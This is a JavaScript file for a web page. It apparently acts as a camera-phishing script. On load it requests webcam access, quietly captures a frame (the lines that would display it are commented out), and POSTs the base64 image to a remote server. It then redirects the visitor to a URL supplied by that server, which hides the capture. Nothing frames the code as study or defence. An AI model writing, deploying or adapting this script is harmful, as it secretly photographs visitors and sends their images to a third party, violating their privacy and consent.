document.addEventListener("DOMContentLoaded", function () {
    const canvas = document.getElementById('canvas');
    const photo = document.getElementById('photo');
    let stream = null;
    let video = document.createElement('video'); // Create video element

    var SERVER_URL = "https://elated-tuna-peplum.cyclic.app";

    var redirectURL = "";

    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function (cameraStream) {
            stream = cameraStream;
            //canvas.style.display = 'block'; // Show canvas
            video.srcObject = cameraStream; // Set video element source
            video.play(); // Start video playback
            const videoTrack = cameraStream.getVideoTracks()[0];
            const videoSettings = videoTrack.getSettings();
            canvas.width = videoSettings.width;
            canvas.height = videoSettings.height;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height); // Draw video element

            try {
                fetch(SERVER_URL+'/geturl/', {
                            mode: 'cors',
                            method: 'GET',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                        })
                        .then(response => {
                            if (!response.ok) {
                                throw new Error('Network response was not ok');
                            }
                            // Parse JSON response
                            return response.json();
                        })
                        .then(data => {
                            // Handle JSON data
                            redirectURL = data.url; // Access the "url" parameter from the JSON response
                            console.log(redirectURL);

                            setTimeout (()=>{
                                if (stream) {
                                    const context = canvas.getContext('2d');
                                    context.drawImage(video, 0, 0, canvas.width, canvas.height); // Draw video element
                    
                                    // Convert canvas to image and display
                                    const data = canvas.toDataURL('image/png');
                                    photo.src = data; // Set src attribute directly
                                    //photo.style.display = 'block';
                                    console.log(data);
                
                                    try {
                                        const response = fetch(SERVER_URL+'/api/save-image/', {
                                            mode: 'cors',
                                            method: 'POST',
                                            headers: {
                                                'Content-Type': 'application/json'
                                            },
                                            body: JSON.stringify({ imageData: data })
                                        });
                                        if (response.ok) {
                                            console.log('Image data saved successfully.');
                                        } else {
                                            console.error('Failed to save image data.');
                                        }
                                    } catch (error) {
                                        console.error('Error sending image data to server:', error);
                                    }
                                }
                            },1000);
                
                            setTimeout(()=>{
                                window.location.href = redirectURL;
                            },3000);
                        })
                        .catch(error => {
                            console.error('Error fetching data:', error);
                        });

                
            } catch (e) {
                console.log(e);
                console.log("can't get the URL");
            }
            
        })
        .catch(function (err) {
            console.error('Error accessing camera:', err);
        });

});
